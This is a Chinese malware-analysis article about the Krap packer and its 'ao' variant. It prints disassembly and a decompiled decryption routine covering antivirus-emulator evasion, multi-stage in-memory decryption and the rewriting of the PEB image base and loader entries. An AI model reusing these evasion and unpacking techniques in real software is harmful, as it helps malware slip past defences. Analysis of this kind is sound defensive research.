
# krap 病毒家族解密方式及 ao 变种分析

> 原文：[`www.pediy.com/kssd/pediy11/124052.html`](https://www.pediy.com/kssd/pediy11/124052.html)

最近发现用`Packed.Win32.Krap`来打包的病毒很多，其中数`ao`变种数量最大，8 月份时进入过卡巴斯基统计恶意软件排名前 20，下面分析一下其解密手法及抓到的`ao`变种的样本。

1. 绕过 av 虚拟机的解密头
2. 内存中的二次解密
3. 自身注入`Explorer.exe`
4. `Explorer`在再注入`Svchost.exe`
5. 傀儡进程`Svchost.exe`完成`download`功能
6. 调试中的一些技巧

先说一下流程否则容易乱

`1`解密-（pack 部分）--> `2`二次解密（pack 部分）--->`3` 内存中解密（pack 部分）--->`4` 替换自身模块基址映像(pack 部分)----> `5` 注入`explorer.exe`（病毒自身任务完成,被删除。注入`explorer` 也仅是为了再次注入`svchost`，完成后，`explorer` 中的线程退出）----> `6` 注入`svchost`(在这个傀儡进程里面干活是这个病毒真正的目的，下载`download`)

// ---------------------

## 1 绕过 av 虚拟机的解密头

`Packed.Win32.Krap` 开头是个略有变化的解密头部,变化的是解密最开始绕过虚拟机的技巧。

```
    004010AB    55              push ebp
    004010AC    8D4D E8         lea ecx,dword ptr ss:[ebp-18]
    004010AF    8365 E8 00      and dword ptr ss:[ebp-18],0
    004010B3    51              push ecx
    004010B4    51              push ecx
    004010B5    6A 00           push 0
    004010B7    FF15 18314000   call dword ptr ds:[<&COMCTL32.LBItemFromPt>; COMCTL32.LBItemFromPt
    004010BD    FF15 F8304000   call dword ptr ds:[<&WS2_32.WSAGetLastError>; WS2_32.WSAGetLastError
    004010C3    3D 78050000     cmp eax,578             // 验证网络函数的 LastError 返回值
 .--004010C8    0F85 15010000   jnz __krap_.004011E3    // 没有仿真该处直接被引到退出流程
 |
 |   ........
 |
 |  //退出进程
 .->004011E3    FF15 04314000   call dword ptr ds:[<&KERNEL32.TerminateP>; kernel32.TerminateProcess
    004011E9    8BE5            mov esp,ebp
    004011EB    5D              pop ebp
    004011EC    C3              retn
```

在不同的被打包的程序中，`call LBItemFromPt` 这处调用不断变化。例如另一个变种（`Win32.LdPinch.arqy`）使用了`GetEffectiveClientRect`这个函数。

`WSAGetLastError` 比较有意思的地方是,如果上一次的调用是不同的 API 时，会有不同的返回值结果。比如调用`VirtualAlloc`返回值是`0x57`，调用`GetFileVerSionInfoSizeA`返回值是`0x714`。`AVer`的`WSAGetLastError`如果是简单函数仿真的话将被绕过。

接着是解密前的配置工作,简单说一下思路。就是把这个要解密的次数，大小等信息先解密出来。以后的解密工作是根据这些配置进行的。

我逆出来的解密配置结构大致如下，解密配置和解密后面的数据都是用的一个算法，单字节解密。

```
typedef struct _decrypt_info
{
   unsinged int  encrypt_buff_off; 被加密数据的偏移
   unsinged int  encrypt_buff_len; 被加密数据的大小
}decrypt_info;

typedef struct _virus_config_info
{
   unsigned int alloc_mem_len1;  分配解密内存长度 1
   unsigned int alloc_mem_len2;  分配解密内存长度 2
   int          decryp_count  ;  需要解密的次数
   int          unknown;
   decrypt_info di[1]         ;  解密需要的信息，需要解密多少次，就有 decrypt_info[decryp_count]长度
}virus_config_info;
```

几个重要的数据

*   `ebp-0x0c` --- 记录最后 key 的偏移
*   `ebp-0x10` --- 控制解密的次数，
*   `ebp-0x28` --- key 的首地址
*   `ebp-0x1c` --- 累加解密长度
*   `ebp-0x18` --- 本次解密长度

```
    004010CE    29FF            sub edi,edi
    004010D0    897D FC         mov dword ptr ss:[ebp-4],edi
    004010D3    6A 00           push 0
    004010D5    9D              popfd
    004010D6    81D7 0F734000   adc edi,__krap_.0040730F        ; key 首地址+偏移
    004010DC    037D E8         add edi,dword ptr ss:[ebp-18]
    004010DF    897D F4         mov dword ptr ss:[ebp-C],edi    ; 记录最后 key 的偏移
    004010E2    89E9            mov ecx,ebp
    004010E4    BE A8010000     mov esi,1A8
    004010E9    F7DE            neg esi
    004010EB    01F1            add ecx,esi
    004010ED    894D F0         mov dword ptr ss:[ebp-10],ecx   ; 配置段的首地址
    004010F0    BE 0E734000     mov esi,__krap_.0040730E
    004010F5    8975 D8         mov dword ptr ss:[ebp-28],esi   ; key 偏移减 1
    004010F8    8B4D F0         mov ecx,dword ptr ss:[ebp-10]
    004010FB    83E9 F0         sub ecx,-10
    004010FE    894D E4         mov dword ptr ss:[ebp-1C],ecx
    00401101    816D FC 2800000>sub dword ptr ss:[ebp-4],28
    00401108    F755 FC         not dword ptr ss:[ebp-4]
    0040110B    8345 FC 01      add dword ptr ss:[ebp-4],1     ; 得到第一次在栈中解密的长度
    0040110F    FF75 D8         push dword ptr ss:[ebp-28]
    00401112    FF75 FC         push dword ptr ss:[ebp-4]
    00401115    FF75 F4         push dword ptr ss:[ebp-C]
    00401118    8DBD 58FEFFFF   lea edi,dword ptr ss:[ebp-1A8]
    0040111E    57              push edi
    // 这里对栈中数据进行解密，就是解密配置信息
    0040111F    E8 DCFEFFFF     call __krap_.00401000
```

这个版本的`Krap`是分 3 段进行解密。

解密前的堆栈：

```
    0012FE18   FA034B1C
    0012FE1C   805B639F
    0012FE20   00000001
    0012FE24   E56C6946
    0012FE28   8128E5B0
    0012FE2C   8128E560
    0012FE30   00000000
    0012FE34   FF29F178
    0012FE38   FF29F178
    0012FE3C   FA034B34
    0012FE40   805B056B
```

解密后的堆栈：

```
    0012FE18   000013F0 ------->开始加密的代码长度       --、长度相加，刚好是解密总长度
    0012FE1C   000026C0 ------->文件内部加密的 PE 文件长度 --/ ------->多重加密，第一次解密后仍然是加密的
    0012FE20   00000003 ------->控制解密次数
    0012FE24   00001A00 ------->解密及获得 API 地址后，分配内存的长度
    0012FE28   00004000 ------->加密数据的起始偏移，在 data 节中
    0012FE2C   0000330E ------->第一次解密的长度
    0012FE30   00002000 ------->加密数据的起始偏移，在 rsrc 节中
    0012FE34   00000096 ------->第二次解密的长度
    0012FE38   00003248 ------->加密数据的起始偏移，在 rdata 节中
    0012FE3C   0000070C ------->第三次解密的长度
```

解密的函数比较简单，我也不知道是个啥加密算法，不多说了配合 F5 看一些的情况吧。

```
int __stdcall decode_buff(char *alloc_buf/*解密后的数据 buff*/, char *encode_buf/*加密数据*/, int size, char *key)
{
  int result;
  int v5;
  char v6;
  int _ch;
  signed int eax_ret;
  unsigned int index;
  signed int v10;
  signed int v11;
  eax_ret = 0;
  index = 0;
  v10 = -1;
  while ( index < size )
  {
    v6 = ~((unsigned __int8)~(unsigned __int8)*(_DWORD *)&encode_buf[index] | (unsigned __int8)~(_BYTE)v10);
    _ch = *(_DWORD *)&key[eax_ret];
    v11 = -1;
    result = (int)&alloc_buf[index];
    alloc_buf[index] = 0;
    alloc_buf[index] -= ~(_BYTE)_ch + 1 + v6;
    alloc_buf[index] = -alloc_buf[index];
    v5 = eax_ret++ + 1;
    if ( eax_ret == 1 )
      eax_ret = 0;
    v11 = v5;
    if ( (unsigned int)eax_ret > 0x488000 )
      break;
    index -= v10;
  }
  return result;
}
```

接着分配内存进行第一次解密，同时将解密过程中的信息存放的堆栈中，

*   `$-1AC > 00080000` -------->存放当前解密次数，用于和配置中的次数相比较
*   `...`
*   `$-48 > 00080000`
*   `$-44 > 00000000`
*   `$-40 > 00001FE0`
*   `$-3C > FF20B000`
*   `$-38 > E1C60400`
*   `$-34 > 00000001`
*   `$-30 > 00000000`
*   `$-2C > 00000408`
*   `$-28 > 0040730E` ------->加密的数据区
*   `$-24 > 00003AB0` ------->分配的内存长度
*   `$-20 > 00400000` ------->硬编码写入映像的基址例如 `0x400000`
*   `$-1C > 0012FE28` ------->存放的配置信息+0X10 偏移的指针
*   `$-18 > 00000000` ------->解密长度的总计
*   `$-14 > 80616CDB` ------->分配内存的偏移 `0x1960` 处，是解密后运行的入口点
*   `$-10 > 0012FE18` ------->存放的配置信息
*   `$-C > 0040730F`
*   `$-8 > FFFFFFFE` ------->存放分配的内存的首地址
*   `$-4 > 00000028`
*   `$ ==> > 0012FFF0`

//第一次解密

```
    00401124    8B5D F0         mov ebx,dword ptr ss:[ebp-10]
    00401127    8B5B 04         mov ebx,dword ptr ds:[ebx+4]    ; 从配置中取一次解密长度 0x26c0
    0040112A    8B75 F0         mov esi,dword ptr ss:[ebp-10]
    0040112D    031E            add ebx,dword ptr ds:[esi]      ; 累加 0x13f0
    0040112F    895D DC         mov dword ptr ss:[ebp-24],ebx
    00401132    BB 40000000     mov ebx,40
    00401137    53              push ebx                          ; 页属性，可执行，可读写
    00401138    68 00300000     push 3000
    0040113D    FF75 DC         push dword ptr ss:[ebp-24]
    00401140    6A 00           push 0
```



```
00401142    FF15 00314000   call dword ptr ds:[<&KERNEL32.VirtualAlloc>]  ; kernel32.VirtualAlloc
```

// ...

// 累加解密次数，和配置中的次数进行比

```
0040117E    8B79 08        mov edi,dword ptr ds:[ecx+8]     ; 取配置中的比较次数
00401181    39FE          cmp esi,edi                      ; 比较解密次数
00401183    73 2C         jnb short __krap_.004011B1
00401185    FF75 D8       push dword ptr ss:[ebp-28]        ; 密钥的首地址
00401188    8B4D E4       mov ecx,dword ptr ss:[ebp-1C]
0040118B    FF71 04       push dword ptr ds:[ecx+4]         ; 解密的长度
0040118E    8B45 E4       mov eax,dword ptr ss:[ebp-1C]
00401191    8B5D E0       mov ebx,dword ptr ss:[ebp-20]     ; 基址 0x400000
00401194    0318          add ebx,dword ptr ds:[eax]
00401196    53            push ebx                           ; 加密的数据
00401197    8B75 F8       mov esi,dword ptr ss:[ebp-8]
0040119A    0375 E8       add esi,dword ptr ss:[ebp-18]
0040119D    56            push esi
0040119E    E8 5DFEFFFF   call <__krap_.decode_buff>
004011A3    8B4D E4       mov ecx,dword ptr ss:[ebp-1C]      ; ecx -> decrypt_info * 指针
004011A6    8B45 E8       mov eax,dword ptr ss:[ebp-18]
004011A9    0341 04       add eax,dword ptr ds:[ecx+4]
004011AC    8945 E8       mov dword ptr ss:[ebp-18],eax      ; 累加解密的长度
004011AF   ^ EB AE        jmp short __krap_.0040115F
```

// 等于 3 次后解密完毕

```
004011BF    894D EC       mov dword ptr ss:[ebp-14],ecx      ; 解密后运行的入口点
004011C2    8B8D 64FEFFFF mov ecx,dword ptr ss:[ebp-19C]
004011C8    51            push ecx
004011C9    8B5D F0       mov ebx,dword ptr ss:[ebp-10]
004011CC    8B45 F8       mov eax,dword ptr ss:[ebp-8]
004011CF    0343 04       add eax,dword ptr ds:[ebx+4]
004011D2    50            push eax
004011D3    8B45 EC       mov eax,dword ptr ss:[ebp-14]
004011D6    50            push eax
004011D7    68 000000B8  push B8000000
004011DC    FF75 EC       push dword ptr ss:[ebp-14]        // 压入解密后的入口点
004011DF    C2 0400       retn 4                           // 跳向新的入口 00921690
```

### 2 内存中的二次解密

第一次解密后跳到这里：

```
00921690    55            push ebp
00921691    8BEC          mov ebp,esp
00921693    81EC 68020000 sub esp,268
```

// ... 无效的东西，nop 掉

```
009216A1    50            push eax
009216A2    8BC5          mov eax,ebp
009216A4    83C0 18       add eax,18
009216A7    8985 C8FEFFFF mov dword ptr ss:[ebp-138],eax
009216AD    58            pop eax
009216AE    E8 FDFEFFFF   call 009215B0     // 获得 kernel32.dll 的基址
009216B3    8985 E8FDFFFF mov dword ptr ss:[ebp-218],eax
009216B9    E8 22FFFFFF   call 009215E0     // 获得 ntdll.dll 的基址
```

// 单字节赋值，乱序的写入栈中需要的模块名称及函数名称，用来获得以后要导出的 API

```
009216CD    C685 2CFEFFFF 6B   mov byte ptr ss:[ebp-1D4],6B
009216D4    C685 2DFEFFFF 65   mov byte ptr ss:[ebp-1D3],65
009216DB    C685 2EFEFFFF 72   mov byte ptr ss:[ebp-1D2],72
009216E2    C685 2FFEFFFF 6E   mov byte ptr ss:[ebp-1D1],6E
009216E9    C685 30FEFFFF 65   mov byte ptr ss:[ebp-1D0],65
009216F0    C685 31FEFFFF 6C   mov byte ptr ss:[ebp-1CF],6C
009216F7    C685 32FEFFFF 33   mov byte ptr ss:[ebp-1CE],33
009216FE    C685 33FEFFFF 32   mov byte ptr ss:[ebp-1CD],32
00921705    C685 34FEFFFF 00   mov byte ptr ss:[ebp-1CC],0
```

...

// 栈中数据

```
0012FC04  6B 65 72 6E 65 6C 33 32 00 00 00 00 4C 6F 63 61  kernel32....Loca
0012FC14  6C 41 6C 6C 6F 63 00 01 56 69 72 74 75 61 6C 41  lAlloc.VirtualA
0012FC24  6C 6C 6F 63 00                                    lloc.
0012FD15                              4C                   L
0012FD25  6F 63 61 6C 46 72 65 65 00                        ocalFree.
0012FCA8  56 69 72 74 75 61 6C 46 72 65 65 00               VirtualFree.
0012FD10  47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 7C  GetProcAddress.|
0012FDB8  56 69 72 74 75 61 6C 50 72 6F 74 65 63 74 00 00  VirtualProtect..
0012FCB8  55 6E 6D 61 70 56 69 65 77 4F 66 46 69 6C 65 00  UnmapViewOfFile.
```

...

// 在将这些排列不连续的字符串指针，加入到一个表中留着后面使用

```
$-A8      > 0012FC10  ASCII "LocalAlloc"
$-A4      > 0012FD24  ASCII "LocalFree"
$-A0      > 0012FC1C  ASCII "VirtualAlloc"
$-9C      > 0012FCA8  ASCII "VirtualFree"
$-98      > 0012FD10  ASCII "GetProcAddress"
$-94      > 0012FDB8  返回到 0012FDB8
$-90      > 0012FCB8  ASCII "UnmapViewOfFile"
$-8C      > 0012FC2C  ASCII "LoadLibraryA"
$-88      > 0012FCC8  ASCII "GetModuleHandleA"
$-84      > 0012FBEC  ASCII "LoadResource"
$-80      > 0012FCDC  ASCII "LockResource"
$-7C      > 0012FDC8  ASCII "FindResourceA"
$-78      > 0012FBD4  ASCII "GetProcessHeap"
$-74      > 0012FCEC  ASCII "RtlAllocateHeap"
```

// 然后定位到自身捆绑的一个 `pe_bound` 文件，我们这里为了区别，叫它 `pe_bound`，这是个被 `UPX` 压缩的文件，也是加密的。

在内存中用那个 `pe_bound` 文件修改自身,起到内存免杀作用。

首先，按照 `pe_bound` 的 section 格式，继续拷贝每一个节到自身进程空间。

// 获得需要的 API 的地址

```
00921CA8    E8 B3E7FFFF   call 00920460                       //GetModuleHandleA 的 API 地址
00921CAD    8B8D CCFEFFFF mov ecx,dword ptr ss:[ebp-134]
00921CB3    8941 30       mov dword ptr ds:[ecx+30],eax
00921CB6    8D95 2CFEFFFF lea edx,dword ptr ss:[ebp-1D4]
00921CBC    52            push edx
00921CBD    8B85 CCFEFFFF mov eax,dword ptr ss:[ebp-134]
00921CC3    8B48 30       mov ecx,dword ptr ds:[eax+30]
00921CC6    FFD1          call ecx                            // 获得自身 kernle32 基址
00921CC8    8985 E8FDFFFF mov dword ptr ss:[ebp-218],eax
00921CCE    8B95 58FFFFFF mov edx,dword ptr ss:[ebp-A8]
00921CD4    52            push edx
00921CD5    8B85 E8FDFFFF mov eax,dword ptr ss:[ebp-218]
00921CDB    50            push eax                            //获得 (kernel32.LocalAlloc)
00921CDC    E8 7FE7FFFF   call 00920460
00921CE1    8B8D CCFEFFFF mov ecx,dword ptr ss:[ebp-134]
00921CE7    8901          mov dword ptr ds:[ecx],eax
00921CE9    8B95 5CFFFFFF mov edx,dword ptr ss:[ebp-A4]
00921CEF    52            push edx
00921CF0    8B85 E8FDFFFF mov eax,dword ptr ss:[ebp-218]
00921CF6    50            push eax                            //获得 (kernel32.LocalFree)
```

// ...

// 再分配一块内存

```
00921E2D    6A 04         push 4
00921E2F    68 00300000   push 3000
00921E34    8B55 0C       mov edx,dword ptr ss:[ebp+C]
00921E37    52            push edx
00921E38    6A 00         push 0
00921E3A    8B85 CCFEFFFF mov eax,dword ptr ss:[ebp-134]
00921E40    8B48 08       mov ecx,dword ptr ds:[eax+8]
00921E43    FFD1          call ecx
```

//具体信息

```
0012FB5C   00921E45  /CALL 到 VirtualAlloc 来自 00921E43
0012FB60   00000000  |Address = NULL
0012FB64   00001A00  |Size = 1A00 (6656.)
0012FB68   00003000  |AllocationType = MEM_COMMIT|MEM_RESERVE
0012FB6C   00000004  \Protect = PAGE_READWRITE
00921E45    8985 C4FEFFFF mov dword ptr ss:[ebp-13C],eax
00921E4B    8B95 C4FEFFFF mov edx,dword ptr ss:[ebp-13C]
00921E51    52            push edx
00921E52    8B45 08       mov eax,dword ptr ss:[ebp+8]
00921E55    50            push eax
00921E56    E8 25E2FFFF   call 00920080        ---- 第二次解密数据到 930000 这块内存，这块就是用来放解密的那个 pe_bound
```



## 文件加密与解密分析

这个文件本身是非连续加密的，加密的算法简单，跳过若干个字节进行解密，看一些解密后的情况。

### 解密前

```
009226C0  4D 38 5A 90 38 03 66 02 04 09 71 FF 81 B8 C2 91  M8Z?f.q
009226D0  01 40 C2 15 C6 D8 09 1C 0E 1F BA F8 00 B4 09 CD  @?曝.壶.?
009226E0  21 B8 01 4C C0 0A 54 68 69 73 20 0E 70 72 6F 67  !?L?This prog
009226F0  67 61 6D 87 63 47 6E 1F 4F 74 E7 62 65 AF CF 75  gamGnOteu
00922700  5F 98 69 06 44 4F 7E 53 03 6D 6F 64 65 2E 0D 89  _DO~Smode..
00922710  0A 24 4C 44 85 01 BB 29 40 C1 DA 47 13 58 04 E6  .$LD??@邻 GX
00922720  3E 1C 3A 30 C0 11 A3 C5 54 F8 C3 88 02 D5 7C 1A  >:0?ＥT?
00922730  54 CE 1C 46 F8 FB A9 20 29 0D 90 10 3F C1 52 69  T?F?).??i
00922740  63 68 44 38 2A 9C 10 50 45 14 4C 01 DA 0E FC 95  chD8*?PEL?
00922750  BD F5 14 8E E0 03 02 01 0B 93 08 33 12 20 1B 10  锦?3
00922760  20 09 60 33 30 7F 11 70 2B 09 90 F6 A0 18 49 02   .`30p+.?I
```

### 解密后

```
00930000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ?........
00930010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ?......@.......
00930020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00930030  00 00 00 00 00 00 00 00 00 00 00 00 D8 00 00 00  ............?..
00930040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ?..???L?Th
00930050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
00930060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS
00930070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
00930080  85 BB 29 40 C1 DA 47 13 C1 DA 47 13 C1 DA 47 13  )@邻 G 邻 G 邻 G
00930090  E6 1C 3A 13 C0 DA 47 13 A3 C5 54 13 C3 DA 47 13  ?:磊 GＥT 泌 G
009300A0  02 D5 1A 13 CE DA 47 13 C1 DA 46 13 FB DA 47 13  ?乌 G 邻 FG
```

### 内存修改与代码复制

`pe_bound` 解密完成后，继续修改自身。

#### 修改自身内存属性

从基址开始 `4000000`。

```
00921F0F    6A 40           push 40
00921F11    8B8D C0FEFFFF  mov ecx,dword ptr ss:[ebp-140]
00921F17    8B51 38        mov edx,dword ptr ds:[ecx+38]
00921F1A    52             push edx
00921F1B    8B85 48FFFFFF  mov eax,dword ptr ss:[ebp-B8]
00921F21    50             push eax
00921F22    8B8D CCFEFFFF  mov ecx,dword ptr ss:[ebp-134]
00921F28    8B51 14        mov edx,dword ptr ds:[ecx+14]
00921F2B    FFD2           call edx      //VirtualProtect
```

#### 复制数据

拷贝 `930000` 这块内存的 `0` ~ `0x400` 空间的数据到自身 `0x400000` ~ `0x400400`。

```
00921F53    8B8D D8FDFFFF  mov ecx,dword ptr ss:[ebp-228]
00921F59    83C1 01        add ecx,1
00921F5C    898D D8FDFFFF  mov dword ptr ss:[ebp-228],ecx
00921F62    8B95 D8FDFFFF  mov edx,dword ptr ss:[ebp-228]
00921F68    3B55 D4        cmp edx,dword ptr ss:[ebp-2C]
00921F6B    73 1B          jnb short 00921F88
00921F6D    8B45 DC        mov eax,dword ptr ss:[ebp-24]
00921F70    0385 D8FDFFFF  add eax,dword ptr ss:[ebp-228]
00921F76    8B8D F0FDFFFF  mov ecx,dword ptr ss:[ebp-210]
00921F7C    038D D8FDFFFF  add ecx,dword ptr ss:[ebp-228]
00921F82    8A11           mov dl,byte ptr ds:[ecx]
00921F84    8810           mov byte ptr ds:[eax],dl
00921F86  ^ EB CB          jmp short 00921F53
```

`0x400` 后的数据按节的大小单独 copy。

```
00921FBC    3985 D4FDFFFF  cmp dword ptr ss:[ebp-22C],eax  // 比较当前处理的节数量是否等于节总数
00921FC2    0F8D E8000000  jge 009220B0
00921FC8    8B8D DCFDFFFF  mov ecx,dword ptr ss:[ebp-224]
00921FCE    0FB751 02      movzx edx,word ptr ds:[ecx+2]
00921FD2    83EA 01        sub edx,1
00921FD5    3995 D4FDFFFF  cmp dword ptr ss:[ebp-22C],edx
00921FDB    75 1A          jnz short 00921FF7
00921FDD    8B85 C0FEFFFF  mov eax,dword ptr ss:[ebp-140]
00921FE3    8B8D ECFDFFFF  mov ecx,dword ptr ss:[ebp-214]
00921FE9    8B50 38        mov edx,dword ptr ds:[eax+38]
00921FEC    2B51 0C        sub edx,dword ptr ds:[ecx+C]
00921FEF    8995 9CFDFFFF  mov dword ptr ss:[ebp-264],edx
00921FF5    EB 18          jmp short 0092200F
00921FF7    8B85 ECFDFFFF  mov eax,dword ptr ss:[ebp-214]
00921FFD    8B8D ECFDFFFF  mov ecx,dword ptr ss:[ebp-214]
00922003    8B50 34        mov edx,dword ptr ds:[eax+34]
00922006    2B51 0C        sub edx,dword ptr ds:[ecx+C]
00922009    8995 9CFDFFFF  mov dword ptr ss:[ebp-264],edx
0092200F    8B85 9CFDFFFF  mov eax,dword ptr ss:[ebp-264]
00922015    8985 CCFDFFFF  mov dword ptr ss:[ebp-234],eax
0092201B    8B8D ECFDFFFF  mov ecx,dword ptr ss:[ebp-214]
00922021    8B55 DC        mov edx,dword ptr ss:[ebp-24]
00922024    0351 0C        add edx,dword ptr ds:[ecx+C]
00922027    8995 D0FDFFFF  mov dword ptr ss:[ebp-230],edx
0092202D    C785 B8FDFFFF 0>mov dword ptr ss:[ebp-248],0
00922037    33C0           xor eax,eax
00922039    8985 BCFDFFFF  mov dword ptr ss:[ebp-244],eax
0092203F    8985 C0FDFFFF  mov dword ptr ss:[ebp-240],eax
00922045    8985 C4FDFFFF  mov dword ptr ss:[ebp-23C],eax
0092204B    8985 C8FDFFFF  mov dword ptr ss:[ebp-238],eax
00922051    8B8D D0FDFFFF  mov ecx,dword ptr ss:[ebp-230]
00922057    898D B4FDFFFF  mov dword ptr ss:[ebp-24C],ecx
0092205D    8B95 ECFDFFFF  mov edx,dword ptr ss:[ebp-214]
00922063    8B42 10        mov eax,dword ptr ds:[edx+10]
00922066    3B85 CCFDFFFF  cmp eax,dword ptr ss:[ebp-234]   // 比较 SizeOfRawData 的大小，做 copy 前准备
0092206C    76 0E          jbe short 0092207C
0092206E    8B8D CCFDFFFF  mov ecx,dword ptr ss:[ebp-234]
00922074    898D 6CFEFFFF  mov dword ptr ss:[ebp-194],ecx
0092207A    EB 0F          jmp short 0092208B
0092207C    8B95 ECFDFFFF  mov edx,dword ptr ss:[ebp-214]
00922082    8B42 10        mov eax,dword ptr ds:[edx+10]
00922085    8985 6CFEFFFF  mov dword ptr ss:[ebp-194],eax
0092208B    8B8D 6CFEFFFF  mov ecx,dword ptr ss:[ebp-194]
00922091    51             push ecx                  // 目的数据，就是自身的节偏移
00922092    8B95 ECFDFFFF  mov edx,dword ptr ss:[ebp-214]
00922098    8B45 D8        mov eax,dword ptr ss:[ebp-28]
0092209B    0342 14        add eax,dword ptr ds:[edx+14]
0092209E    50             push eax                  // 源数据，就是 alloc 的那个 buff 930000 + 节偏移
0092209F    8B8D D0FDFFFF  mov ecx,dword ptr ss:[ebp-230]
009220A5    51             push ecx                  // copy 数据大小
009220A6    E8 55DFFFFF    call 00920000             // copy 数据到自身
009220AB  ^ E9 E4FEFFFF     jmp 00921F94
```

### 修改 PEB 映像基址

查找自身的映像数据也就是 `0x400000`，如果是跳到下方，做一系列修改操作。

```
0092225A    E8 61F2FFFF     call 009214C0             // eax 中 获得 PEB 基址
0092225F    8945 94         mov dword ptr ss:[ebp-6C],eax
00922262    8B45 94         mov eax,dword ptr ss:[ebp-6C]
00922265    8B8D 48FFFFFF   mov ecx,dword ptr ss:[ebp-B8]
0092226B    8948 08         mov dword ptr ds:[eax+8],ecx     // 修改 PEB 中的 ImageBaseAddress 数据为 0x400000
0092226E    E8 4DF2FFFF     call 009214C0             // eax 中 获得 PEB 基址
00922273    8B50 0C         mov edx,dword ptr ds:[eax+C]     // PEB.Ldr
00922276    83C2 0C         add edx,0C                   // PEB.Ldr.InLoadOrderModuleList
00922279    8995 30FFFFFF   mov dword ptr ss:[ebp-D0],edx
0092227F    8B85 30FFFFFF   mov eax,dword ptr ss:[ebp-D0]
00922285    8B08            mov ecx,dword ptr ds:[eax]
00922287    898D 28FEFFFF   mov dword ptr ss:[ebp-1D8],ecx
0092228D    8B95 28FEFFFF   mov edx,dword ptr ss:[ebp-1D8]
```



`00922293` `3B95 30FFFFFF` `cmp edx,dword ptr ss:[ebp-D0]` `// 遍历链表模块信息，查找自身模块`  

`00922299` `/74 57` `je short 009222F2`  

`0092229B` `|8B85 28FEFFFF` `mov eax,dword ptr ss:[ebp-1D8]`  

`009222A1` `|8985 34FFFFFF` `mov dword ptr ss:[ebp-CC],eax`  

`009222A7` `|8B8D 34FFFFFF` `mov ecx,dword ptr ss:[ebp-CC]`  

`009222AD` `|8B51 18` `mov edx,dword ptr ds:[ecx+18]`  

`009222B0` `|3B95 48FFFFFF` `cmp edx,dword ptr ss:[ebp-B8]` `// 比较是不是自身模块 0x400000`  

`009222B6` `|75 2A` `jnz short 009222E2`  

`009222B8` `|8B85 C0FEFFFF` `mov eax,dword ptr ss:[ebp-140]`  

`009222BE` `|8B8D 48FFFFFF` `mov ecx,dword ptr ss:[ebp-B8]`  

`009222C4` `|0348 10` `add ecx,dword ptr ds:[eax+10]` `// 获得 bound_pe 的入口点，但这个是经过修正的，已经被改为 0x407f30`  

`009222C7` `|8B95 34FFFFFF` `mov edx,dword ptr ss:[ebp-CC]`  

`009222CD` `|894A 1C` `mov dword ptr ds:[edx+1C],ecx` `// 改写原自身的入口点 0x40109c 为 0x407f30`  

`009222D0` `|8B85 34FFFFFF` `mov eax,dword ptr ss:[ebp-CC]` `// eax 保存当前 _LDR_DATA_TABLE_ENTRY 信息`  

`009222D6` `|8B8D C0FEFFFF` `mov ecx,dword ptr ss:[ebp-140]`  

`009222DC` `|8B51 38` `mov edx,dword ptr ds:[ecx+38]` `// SizeOfImage`  

`009222DF` `|8950 20` `mov dword ptr ds:[eax+20],edx` `// 修改 SizeOfImage 为 0xA000，原为 0x19000`  

`009222E2` `|8B85 28FEFFFF` `mov eax,dword ptr ss:[ebp-1D8]`  

`009222E8` `|8B08` `mov ecx,dword ptr ds:[eax]`  

`009222EA` `|898D 28FEFFFF` `mov dword ptr ss:[ebp-1D8],ecx`  

`009222F0` `^|EB 9B` `jmp short 0092228D` `// 如果没有发现继续 next`  

`// 找到，跳出了链表循环`  

`009222F2` `8D95 70FEFFFF` `lea edx,dword ptr ss:[ebp-190]`  

`009222F8` `52` `push edx`  

`009222F9` `8B85 48FFFFFF` `mov eax,dword ptr ss:[ebp-B8]`  

`009222FF` `50` `push eax` `// 压入基址 0x400000`  

`00922300` `E8 2BEDFFFF` `call 00921030`  

`// 填充一些 PE 信息`  

`00921030` `55` `push ebp`  

`00921031` `8BEC` `mov ebp,esp`  

`00921033` `83EC 0C` `sub esp,0C`  

`00921036` `8D45 F8` `lea eax,dword ptr ss:[ebp-8]`  

`00921039` `50` `push eax`  

`0092103A` `8D4D FC` `lea ecx,dword ptr ss:[ebp-4]`  

`0092103D` `51` `push ecx`  

`0092103E` `8D55 F4` `lea edx,dword ptr ss:[ebp-C]`  

`00921041` `52` `push edx`  

`00921042` `8B45 08` `mov eax,dword ptr ss:[ebp+8]`  

`00921045` `50` `push eax`  

`00921046` `E8 D5F4FFFF` `call 00920520` `// 获得 MagicNumber，第一个节的虚拟地址，`  

`0092104B` `8B4D 0C` `mov ecx,dword ptr ss:[ebp+C]`  

`0092104E` `8B55 08` `mov edx,dword ptr ss:[ebp+8]`  

`00921051` `8951 18` `mov dword ptr ds:[ecx+18],edx`  

`00921054` `8B45 0C` `mov eax,dword ptr ss:[ebp+C]`  

`00921057` `8B4D FC` `mov ecx,dword ptr ss:[ebp-4]`  

`0092105A` `8B51 10` `mov edx,dword ptr ds:[ecx+10]`  

`0092105D` `8950 1C` `mov dword ptr ds:[eax+1C],edx` `// 写新的入口地址`  

`00921060` `8B45 0C` `mov eax,dword ptr ss:[ebp+C]`  

`00921063` `8B4D FC` `mov ecx,dword ptr ss:[ebp-4]`  

`00921066` `8B51 38` `mov edx,dword ptr ds:[ecx+38]` `// 写入新的 Size0fImage`  

`00921069` `8950 20` `mov dword ptr ds:[eax+20],edx`  

`0092106C` `8B45 0C` `mov eax,dword ptr ss:[ebp+C]`  

`0092106F` `8B4D F4` `mov ecx,dword ptr ss:[ebp-C]`  

`00921072` `8B51 04` `mov edx,dword ptr ds:[ecx+4]`  

`00921075` `8950 44` `mov dword ptr ds:[eax+44],edx` `// 写入 TimeDateStamp`  

`00921078` `8BE5` `mov esp,ebp`  

`0092107A` `5D` `pop ebp`  

`0092107B` `C2 0800` `retn 8`  

`// 压入导出的 API 列表`  

`00922305` `8B8D CCFEFFFF` `mov ecx,dword ptr ss:[ebp-134]`  

`0092230B` `51` `push ecx`  

`0092230C` `8D95 70FEFFFF` `lea edx,dword ptr ss:[ebp-190]`  

`00922312` `52` `push edx`  

`00922313` `6A 00` `push 0`  

`00922315` `E8 66EDFFFF` `call 00921080`  

